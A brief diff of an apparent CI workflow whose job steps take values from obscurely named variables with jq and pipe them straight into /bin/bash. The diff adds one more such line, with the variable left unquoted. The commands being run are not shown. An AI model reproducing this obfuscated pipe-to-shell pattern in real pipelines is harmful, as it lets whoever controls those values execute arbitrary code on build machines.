@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$w2448" | jq -r .dfmr412 | /bin/bash
           printf '%s' "$t5819" | jq -r .k0538 | /bin/bash
           printf '%s' "$c6" | jq -r .dq8 | /bin/bash
+          echo $q90 | jq -r .hdskw4 | /bin/bash
 
       - name: Archive results
         if: always()
